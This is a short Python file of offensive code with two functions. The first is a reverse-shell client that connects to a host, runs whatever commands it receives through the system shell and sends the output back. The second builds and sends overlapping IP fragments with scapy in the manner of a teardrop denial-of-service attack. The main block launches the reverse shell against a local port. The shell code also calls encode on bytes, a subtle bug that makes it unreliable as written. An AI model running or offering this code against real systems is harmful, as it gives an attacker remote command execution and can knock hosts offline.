import socket
import subprocess
from scapy.layers.inet import IP
from scapy.packet import Raw
from scapy.sendrecv import send


def connect_chershire(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    while True:
        try:

            command = client.recv(1024).decode()

            if command.lower() == 'exit':
                break

            result = subprocess.run(command, shell=True, capture_output=True)
            response = result.stdout + result.stderr

            client.send(response.encode())
        except Exception as e:
            print(f"Error: {e}")
            break

    client.close()


def teardrop(target):
    ip = IP(dst=target)

    frag1 = ip / Raw(load="A" * 100)
    frag1[IP].flags = "MF"

    frag2 = ip / Raw(load="B" * 100)
    frag2[IP].flags = "MF"
    frag2[IP].frag = 1

    frag3 = ip / Raw(load="C" * 100)
    frag3[IP].flags = 0
    frag3[IP].frag = 2

    # Send the packets
    send(frag1)
    send(frag2)
    send(frag3)


if __name__ == "__main__":
    connect_chershire('127.0.0.1', 9999)
